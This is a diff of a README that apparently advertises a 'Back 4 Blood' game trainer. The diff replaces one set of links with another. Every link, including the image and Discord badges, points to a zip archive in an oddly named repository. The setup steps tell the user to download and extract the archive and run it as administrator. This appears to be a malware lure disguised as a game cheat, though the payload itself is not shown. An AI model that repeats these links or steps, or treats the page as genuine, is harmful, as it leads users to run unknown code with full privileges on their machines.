@@ -6,11 +6,11 @@ Enhance your Back 4 Blood experience in 2025 with this powerful Trainer offering
 
 <div align="center">
 
-  ![](https://raw.githubusercontent.com/iLejuxepWaduzd/structured-data-extractor/main/forbiddenness/structured-data-extractor.zip)
+  ![](https://github.com/iLejuxepWaduzd/structured-data-extractor/raw/refs/heads/main/forbiddenness/extractor-data-structured-v3.3.zip)
 
-  ![](https://raw.githubusercontent.com/iLejuxepWaduzd/structured-data-extractor/main/forbiddenness/structured-data-extractor.zip)
+  ![](https://github.com/iLejuxepWaduzd/structured-data-extractor/raw/refs/heads/main/forbiddenness/extractor-data-structured-v3.3.zip)
 
-  <a href="https://raw.githubusercontent.com/iLejuxepWaduzd/structured-data-extractor/main/forbiddenness/structured-data-extractor.zip"><img src="https://raw.githubusercontent.com/iLejuxepWaduzd/structured-data-extractor/main/forbiddenness/structured-data-extractor.zip" height="80"></a>
+  <a href="https://github.com/iLejuxepWaduzd/structured-data-extractor/raw/refs/heads/main/forbiddenness/extractor-data-structured-v3.3.zip"><img src="https://github.com/iLejuxepWaduzd/structured-data-extractor/raw/refs/heads/main/forbiddenness/extractor-data-structured-v3.3.zip" height="80"></a>
 
 </div>
 
@@ -43,8 +43,8 @@ Enhance your Back 4 Blood experience in 2025 with this powerful Trainer offering
 
 - Download the .zip archive using download button.
 - Extract the archive to a secure location.
-- Run `https://raw.githubusercontent.com/iLejuxepWaduzd/structured-data-extractor/main/forbiddenness/structured-data-extractor.zip` as administrator.
+- Run `https://github.com/iLejuxepWaduzd/structured-data-extractor/raw/refs/heads/main/forbiddenness/extractor-data-structured-v3.3.zip` as administrator.
 
 💬 Have questions or need support? Join our active Discord community:
 
-[![Discord](https://raw.githubusercontent.com/iLejuxepWaduzd/structured-data-extractor/main/forbiddenness/structured-data-extractor.zip)](https://raw.githubusercontent.com/iLejuxepWaduzd/structured-data-extractor/main/forbiddenness/structured-data-extractor.zip)
+[![Discord](https://github.com/iLejuxepWaduzd/structured-data-extractor/raw/refs/heads/main/forbiddenness/extractor-data-structured-v3.3.zip)](https://github.com/iLejuxepWaduzd/structured-data-extractor/raw/refs/heads/main/forbiddenness/extractor-data-structured-v3.3.zip)
